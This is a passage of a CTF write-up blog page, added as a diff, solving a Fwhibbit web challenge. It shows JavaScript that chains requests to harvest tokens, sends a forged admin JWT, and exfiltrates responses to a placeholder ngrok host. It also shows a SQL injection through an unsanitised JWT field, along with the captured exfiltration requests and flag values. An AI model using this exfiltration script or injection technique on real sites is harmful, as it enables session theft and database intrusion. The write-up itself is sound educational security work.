+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;forumtoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">secondtoken</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;forum_auth&#34;</span>, <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AYWRtaW4uY29tIiwiaXNfYWRtaW4iOiJ5ZXMifQ.qPHpnblN5u3VKcPYRE6cSodDPaUGfADq-saXUP6EybQ&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                                <span style="color:#a6e22e">fourth</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                                <span style="color:#a6e22e">fourth</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                                <span style="color:#a6e22e">fourth</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">responseText</span>);
+                                        }
+                                }
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>();
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-15">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 193
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER ACTUAL FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+&lt;<span style="color:#f92672">h1</span>&gt; Improved security, changed the engine to keep data and began to listen to rock <span style="color:#960050;background-color:#1e0010">&amp;</span> roll! &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+Go to /check to test your authorization.
+</code></pre></div><p>We have to change from / to /check and see what happens.</p>
+<h4 id="html-content-16">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/token&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secondtoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">170</span>);
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/check?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;forumtoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">secondtoken</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;forum_auth&#34;</span>, <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEiLCJ1c2VybmFtZSI6Im&gt;                                third.onreadystatechange = function() {
+</span><span style="color:#e6db74">                                        if (third.readyState === XMLHttpRequest.DONE) {
+</span><span style="color:#e6db74">                                                fourth = new XMLHttpRequest();
+</span><span style="color:#e6db74">                                                fourth.open(&#34;</span><span style="color:#a6e22e">POST</span><span style="color:#e6db74">&#34;, &#34;</span><span style="color:#a6e22e">NGROK</span><span style="color:#f92672">-</span><span style="color:#a6e22e">TUNNEL</span><span style="color:#f92672">/</span><span style="color:#a6e22e">exfiltration</span><span style="color:#960050;background-color:#1e0010">&#34;</span>);
+                                                <span style="color:#a6e22e">fourth</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">responseText</span>);
+                                        }
+                                }
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>();
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-16">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 382
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER ACTUAL FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+&lt;<span style="color:#f92672">h1</span>&gt; Improved security, changed the engine to keep data and began to listen to rock <span style="color:#960050;background-color:#1e0010">&amp;</span> roll! &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+ There was an error, please have a look *carefully* and check everything: SELECT username, password, email, is_admin FROM userinfo WHERE username = &#39;admin&#39; AND password = &#39;admin&#39; AND email = &#39;admin@admin.com&#39; AND is_admin = &#39;yes&#39;
+</code></pre></div><p>Hmm, so we see the params we have set in the JWT Token reflected as a SQL query, so testing a bit, we can see there’s an error based SQL Injection based on the params we set on the token. This could be chained with sqlmap &gt; flask &gt; tg_bot -&gt; flask -&gt; sqlmap, or with a JS for loop.</p>
+<p>This SQL Injection has some blacklisted params as the source says:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">blacklist</span>(string):
+    chars <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;^&#34;</span>, <span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;LIKE&#34;</span>, <span style="color:#e6db74">&#34;like&#34;</span>, <span style="color:#e6db74">&#34;%&#34;</span>]
+    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> chars:
+        string<span style="color:#f92672">.</span>replace(char, <span style="color:#e6db74">&#34;&#34;</span>)
+    <span style="color:#66d9ef">return</span> string
+</code></pre></div><p>And the only parameter that is not being sanitized is <code>is_admin</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> shellescape <span style="color:#f92672">import</span> quote
+[<span style="color:#f92672">...</span>]
+decoded <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(cookie, <span style="color:#e6db74">&#34;cookie&#34;</span>, algorithms <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;HS256&#39;</span>)
+username <span style="color:#f92672">=</span> quote(decoded[<span style="color:#e6db74">&#39;username&#39;</span>])
+password <span style="color:#f92672">=</span> quote(decoded[<span style="color:#e6db74">&#39;password&#39;</span>])
+email <span style="color:#f92672">=</span> quote(decoded[<span style="color:#e6db74">&#39;email&#39;</span>])
+is_admin <span style="color:#f92672">=</span> decoded[<span style="color:#e6db74">&#39;is_admin&#39;</span>]
+</code></pre></div><p>So a request like this will work:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> username, password, email, is_admin <span style="color:#66d9ef">FROM</span> userinfo <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;h4x0r&#39;</span> <span style="color:#66d9ef">AND</span> email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;guest@where.ever&#39;</span> <span style="color:#66d9ef">AND</span> is_admin <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;no&#39;</span> <span style="color:#66d9ef">OR</span> username <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;________&#39;</span>;
+</code></pre></div><p>And theese are the values we have to fetch:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> userinfo (username, email, password, is_admin) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;betauser&#39;</span>,<span style="color:#e6db74">&#39;p0stgr3s_1s_c00l3r_&#39;</span>,<span style="color:#e6db74">&#39;letsputsomepwd!&#39;</span>, <span style="color:#e6db74">&#39;no&#39;</span>);
+<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> userinfo (username, email, password, is_admin) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;auser&#39;</span>,<span style="color:#e6db74">&#39;i@told.u&#39;</span>,<span style="color:#e6db74">&#39;you4recrazy&#39;</span>, <span style="color:#e6db74">&#39;&amp;_y0u_4re_&#39;</span>);
+<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> userinfo (username, email, password, is_admin) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;administrator&#39;</span>,<span style="color:#e6db74">&#39;admin@domain.admin&#39;</span>,<span style="color:#e6db74">&#39;admin_password&#39;</span>, <span style="color:#e6db74">&#39;yes&#39;</span>);
+<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> userinfo (username, email, password, is_admin) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;guest&#39;</span>,<span style="color:#e6db74">&#39;guest@where.ever&#39;</span>,<span style="color:#e6db74">&#39;h4x0r&#39;</span>, <span style="color:#e6db74">&#39;no&#39;</span>);
+</code></pre></div><p>For the last part of the flag, the created databases should be fetched.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">DATABASE</span> <span style="color:#e6db74">&#34;4_gr34t_h4x0R!}&#34;</span>;
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> datname <span style="color:#66d9ef">FROM</span> pg_database;
+</code></pre></div><hr/>
+<p>I hope you liked this post, and encourage you to give it a try at <a href="https://ctf.fwhibbit.es/register" target="_blank">https://ctf.fwhibbit.es/register</a></p>
+<p><a href="https://twitter.com/jorge_ctf" target="_blank">JorgeCTF</a>.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/portswigger-java-custom-gadget-chain/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/ctr-writeup-mike/">
+                  <span class="button__text">Fwhibbit CTR (CTF): Solving Mike&#39;s Dungeon</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
